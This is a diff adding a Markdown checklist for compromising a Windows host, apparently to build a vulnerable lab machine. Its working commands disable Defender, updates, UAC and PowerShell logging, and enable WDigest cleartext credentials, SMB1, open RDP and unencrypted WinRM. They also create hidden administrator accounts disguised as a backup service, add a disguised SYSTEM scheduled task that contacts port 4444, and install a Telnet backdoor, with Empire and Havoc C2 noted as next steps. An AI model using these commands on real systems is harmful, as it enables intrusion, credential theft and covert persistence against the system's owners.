@@ -1,0 +1,71 @@
+- [ ] Remove Updates
+	- [x] Stop-Service wuauserv -Force
+	- [x] Set-Service wuauserv -StartupType Disabled
+	- [x] reg add "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f
+
+- [ ] Nuke Defender
+	- [x] Set-MpPreference -DisableRealtimeMonitoring $true
+	- [x] reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /f
+		- [x] gpupdate /force
+
+- [x] SMB1
+- [x] SMB2
+- [x] SMB3
+- [ ] SSH Key Backdoor ^
+- [ ] Group Policy Misconfigs 
+	- [ ] Turn off Script Block Logging
+	- [ ] Allow unrestricted execution
+	- [ ] Allow RDP for all users
+	- [ ] Enable WDigest
+	- [ ] Weak NTFS permissions
+
+- [ ] Registry Misconfigs
+	- [ ] reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
+	- [ ] reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f
+	- [ ] reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+	- [ ] reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+	- [ ] reg add "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" /v AUOptions /t REG_DWORD /d 1 /f
+	- [ ] reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v SMB1 /t REG_DWORD /d 1 /f
+	- [ ] reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f
+	- [ ] reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f
+	- [ ] reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 0 /f
+	- [ ] reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+	- [ ] reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
+
+- [ ] Multiple Hidden Admins (2-3)
+	- [ ] net user svc-backup P@ssw0rd2026! /add
+	- [ ] net localgroup Administrators svc-backup /add
+	- [ ] HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList
+	- [ ] reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v svc-backup /t REG_DWORD /d 0 /f
+	- [ ] wmic UserAccount where Name='svc-backup' set PasswordExpires=FALSE
+	- [ ] net user svc-backup /comment:"Backup Service Account"
+
+- [ ] Scheduled Tasks for Persistence
+	- [ ] Logon Trigger
+	- [ ] Every 5 minutes
+	- [ ] mkdir C:\ProgramData\SysTasks -Force
+	- [ ] notepad C:\ProgramData\SysTasks\health.ps1
+		- [ ] Test-NetConnection 192.168.56.1 -Port 4444
+	- [ ] schtasks /create /tn "System Update Check" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\SysTasks\health.ps1" /sc minute /mo 5 /ru SYSTEM
+
+- [ ] Enable Powershell Remoting
+	- [ ] Enable-PSRemoting -Force
+	- [ ] Set-Item WSMan:\localhost\Service\AllowUnencrypted $true
+	- [ ] Set-Item WSMan:\localhost\Service\Auth\Basic $true
+
+- [ ] Enable Remote Network Shares 
+	- [ ] New-SmbShare -Name Public -Path C:\Public -FullAccess Everyone
+
+- [ ] Enable WMIC Access
+	- [ ] netsh advfirewall firewall set rule group="Windows Management Instrumentation (WMI)" new enable=yes
+
+- [ ] Telnet Backdoor
+	- [ ] Install-WindowsFeature Telnet-Server
+	- [ ] Start-Service TlntSvr
+	- [ ] Set-Service TlntSvr -StartupType Automatic
+	- [ ] netsh advfirewall firewall add rule name="Telnet" dir=in action=allow protocol=TCP localport=23
+
+- [ ] EmpireC2 ^
+- [ ] HavocC2 ^
+
+^ = Need to Automate 
